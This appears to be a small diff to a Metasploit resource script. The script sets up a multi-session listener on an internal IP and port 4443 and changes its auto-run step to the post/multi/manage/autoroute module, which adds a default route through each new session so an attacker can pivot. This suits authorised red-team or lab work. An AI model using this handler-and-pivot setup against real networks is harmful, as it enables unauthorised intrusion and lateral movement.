@@ -17,8 +17,9 @@ set LHOST 10.20.70.172
 set LPORT 4443
 set ExitOnSession false
 
-# Auto-run on every new session: add route
-set AutoRunScript multi_console_command -c "run autoroute -s 0.0.0.0/0"
+# Auto-run on every new session: add default route via post module
+# (multi_console_command loses quotes in .rc files — use the post module directly)
+set AutoRunScript post/multi/manage/autoroute SUBNET=0.0.0.0 NETMASK=0.0.0.0
 
 run -j
 
